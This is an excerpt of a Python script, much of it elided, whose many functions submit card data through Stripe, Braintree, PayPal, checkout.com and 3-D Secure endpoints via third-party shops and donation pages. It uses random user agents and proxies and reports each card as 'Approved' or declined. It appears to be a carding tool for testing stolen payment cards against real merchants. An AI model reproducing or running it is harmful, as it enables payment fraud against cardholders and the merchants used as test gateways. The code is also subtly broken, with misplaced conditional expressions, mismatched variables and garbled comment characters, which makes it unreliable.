...
def vip(card_data):
	try:
		...
		response = safe_request('post', 'https://api.stripe.com/v1/tokens', headers=headers, data=data)
		json_resp = safe_json_response(response, "Stripe API unavailable")
		
		if 'error' in json_resp:
			return json_resp['error']
			
		if 'id' not in json_resp:
			return "Invalid token response from Stripe"
			
		id = json_resp['id']
	except Exception as e:
		return f"Card format error: {str(e)}"
	
	# Second API call to ChargeeBee
	headers = {
	...
	response = safe_request('post', 'https://scraperapi.chargebee.com/api/internal/payment_intents/confirm', headers=headers, json=json_data)
	json_resp = safe_json_response(response, "ChargeeBee API unavailable")
	
	if 'error' in json_resp:
		return json_resp['error']
	
	try:
		return json_resp['payment_intent']['active_payment_attempt']['error_detail']['error_message']
	except KeyError:
		return "Invalid response from ChargeeBee API"
def stc(card_data):
	try:
		ua = UserAgent()
		rua = ua.random
		...
		return f"Service unavailable: {str(e)[:100]}"
def pay(card_data):
	try:
	...
	#ââââââââââââââââââââââ#
		...
		response1 = safe_request("get", 'https://metager.org/spende/1/once/paypal/card/order', headers=headers,proxies=proxy)
		iD = response1.json() if response else {"error": "No response"}["id"]
		print(iD)
	
		if len(iD) != 17:
			process_card_p(card_data)
	#ââââââââââââââââââââââ#
		response = safe_request("get", 'https://metager.org/spende/5/once/paypal/card',proxies=proxy)
	...
	#âââââââââââââââââââââââ#
		response2 = safe_request("post", 'https://metager.org/spende/1/once/paypal/card/order', headers=headers, json=json_data,proxies=proxy)
		response_code = "un"
		try:
			response_code = response2.json() if response else {"error": "No response"}["purchase_units"][0]["payments"]["captures"][0]["processor_response"]["response_code"]
...
def sa(ccx):
	try:
		...
		response = safe_request("post", 'https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
		id=(response.json() if response else {"error": "No response"}['id'])
		cookies = {
		...
		response = safe_request("post", 'https://www.punctualkart.com/', params=params, cookies=cookies, headers=headers, data=data)
		try:
			i=(response.json() if response else {"error": "No response"}['error']['message'])
		except:
			return 'Approved'
		return i
...
def up():
	try:
			...
			response = safe_request("post", 'https://api.layerpanel.com/api/auth/login', headers=headers, json=json_data)
			tok=(response.json() if response else {"error": "No response"}['token'])
...
def chk():
	try:
			...
			try:
				...
				return(response.json() if response else {"error": "No response"}['error']['message'])
			headers = {
			    'authority': 'api.layerpanel.com',
			    'accept': 'application/json, text/plain, */*',
			    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
			...
			response = safe_request("post", 'https://api.layerpanel.com/api/panel/create-card/AM-78775822', headers=headers, json=json_data)
			...
			if 'Token is Invalid' in response.text:
				...
				try:
					return (response.json() if response else {"error": "No response"}['errors'][0]['message'])
				except:
					pass
				id=response.json() if response else {"error": "No response"}['card_id']
				time.sleep(3)
				headers = {
				    'authority': 'api.layerpanel.com',
				    'accept': 'application/json, text/plain, */*',
				...
				response = safe_request("post", 'https://api.layerpanel.com/api/panel/delete-card/AM-78775822', headers=headers, json=json_data)
				return 'Approved'
		ii=chk()
		return ii
...
def info(card):
	try:
		...
		headers = {
								...
								'preferred_scheme': '',
								'requestSource': 'JS',
							};response = safe_request("post", 'https://api.checkout.com/tokens', headers=headers, json=json_data)
		data = ['scheme', 'card_type', 'issuer']
		result = []
		for field in data:
			try:
				result.append(response.json() if response else {"error": "No response"}[field])
			except:
				result.append("------")
		try:
			us=response.json() if response else {"error": "No response"}['issuer_country']
...
def sd(ccx):
	try:
		...
		response = safe_request("get", 'https://www.bizinkonline.com/my-account/', headers=headers)
		...
		response = safe_request("post", 'https://www.bizinkonline.com/my-account/', headers=headers, data=data)	
		response = safe_request("get", 'https://www.bizinkonline.com/my-account/add-payment-method/', headers=headers)
		...
		response = safe_request("post", 'https://www.bizinkonline.com/', params=params, cookies=r.cookies, headers=headers, data=data)
...
def scc(ccx):
	try:
		...
		response = safe_request("post", 'https://ladymcadden.org/', params=params, cookies=cookies, headers=headers, data=data)
		if 'success' in response.text:
			return 'Approved'
			...
			response = safe_request("get", 'https://ladymcadden.org/my-account/add-payment-method/', cookies=cookies, headers=headers)
			...
			return 'Your card was declined.' 
		try:		
			ct=(response.json() if response else {"error": "No response"}['client_secret'])
		...
		sc=response.json() if response else {"error": "No response"}['next_action']['use_stripe_sdk']['three_d_secure_2_source']
		headers = {
		    'authority': 'api.stripe.com',
		    'accept': 'application/json',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		...
		response = safe_request("post", 'https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data)
		headers = {
		    'authority': 'api.stripe.com',
		    'accept': 'application/json',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		...
		response = safe_request("get", f'https://api.stripe.com/v1/setup_intents/{cts}', params=params, headers=headers)
		try:
			return (response.json() if response else {"error": "No response"}['last_setup_error']['message'])
		except:
			return '3d_secure_2'
...
def sh(card):
	try:
		...
		id=response.json() if response else {"error": "No response"}['card_nonce']
		headers = {
		...
		response = safe_request("post", 'https://phpstack-1046663-3864545.cloudwaysapps.com//controller.php', headers=headers, data=data)
		try:
			res=(response.json() if response else {"error": "No response"}['message'].split(':')[1].split('<')[0].replace("'",""))
		except:
			res=(response.json() if response else {"error": "No response"}['message'])
		return res
...
def pv(ccx):
	try:
		...
		response = safe_request("post", 
		    ...
		    json=cards
		).json() if response else {"error": "No response"}
		try:
...
def get_ref():
	try:
			...
			response = safe_request("get", 'https://www.sportfish.co.uk/checkout/', cookies=cookies, headers=headers)
			...
			response = safe_request("post", 'https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
			cardnal=response.json() if response else {"error": "No response"}['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
			headers = {
			...
			response = safe_request("post", 'https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
			payload = response.json() if response else {"error": "No response"}['CardinalJWT']
...
def result(cc):
	try:
			...
			response = safe_request("post", 'https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
			try:
				tok = response.json() if response else {"error": "No response"}['data']['tokenizeCreditCard']['token']
			except:
				get_ref()
			headers = {
			...
			try:
				string=response.json() if response else {"error": "No response"}['paymentMethod']['threeDSecureInfo']['status']
			except:
				return 'Error'
...
def brr(ccx):
	try:
		...
		response = safe_request("post", 'https://www.kits.com/api/payment/finish',headers=headers, json=json_data)
	
		# Note: json_data will not be serialized by requests
		# exactly as it was in the original request.
		#data = '{"nonce":"tokencc_bh_92ty85_n7ck2k_md6wdd_pdv929_nxz","agreement1":1,"payment_type":"cc"}'
		#response = safe_request("post", 'https://www.kits.com/api/payment/finish', cookies=cookies, headers=headers, data=data)
		try:
			k=(response.json() if response else {"error": "No response"}['errors'][0])
			try:
				k=k.split(':')[2]
			except:pass
			return k
...
def be(ccx):
	try:
		...
		response = safe_request("post", 'https://app.brandmark.io/v3/client_token.php', cookies=cookies, headers=headers, json=json_data)
		...
		#response = safe_request("post", 'https://app.brandmark.io/v3/client_token.php', cookies=cookies, headers=headers, data=data)
		ui=(response.json() if response else {"error": "No response"}["client_token"])
		import base64,re
		...
		#response = safe_request("post", 'https://payments.braintree-api.com/graphql', headers=headers, data=data)
		tok=(response.json() if response else {"error": "No response"}['data']['tokenizeCreditCard']['token'])
		import requests
		...
		response = safe_request("post", 'https://app.brandmark.io/v3/charge.php', cookies=cookies, headers=headers, json=json_data)
		ug=(response.json() if response else {"error": "No response"}['status'])
		msg=(response.json() if response else {"error": "No response"}['message'])
		if ug=='success':
			return ug
		else:
			return msg
...
def sff(ccx):
	try:
		...
		response = safe_request("post", 'https://kaffakoffee.com/', params=params, cookies=cookies, headers=headers, data=data)
		try:
			return(response.json() if response else {"error": "No response"}['data']['status'])
		except:
			return(response.json() if response else {"error": "No response"}['data']['error']['message'])
...
def num():
	try:
		...
		response = safe_request("post", 'https://switchupcb.com/shop/drive-me-so-crazy/', headers=headers, data=multipart_data)
		headers = {
		    'authority': 'switchupcb.com',
		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		    'accept-language': 'en-US,en;q=0.9',
		...
		response = safe_request("get", 'https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers)
		...
		response = safe_request("post", 'https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data)
		...
		id = response.json() if response else {"error": "No response"}['data']['id']
		pcp = response.json() if response else {"error": "No response"}['data']['custom_id']
		...
		response = safe_request("get", 'https://www.paypal.com/smart/card-fields', params=params, headers=headers)
...
def generate_random_code():
	try:
		...
		if ('ADD_SHIPPING_ERROR' in last or
			...
			message = response.json() if response else {"error": "No response"}['errors'][0]['message']
			code = response.json() if response else {"error": "No response"}['errors'][0]['data'][0]['code']
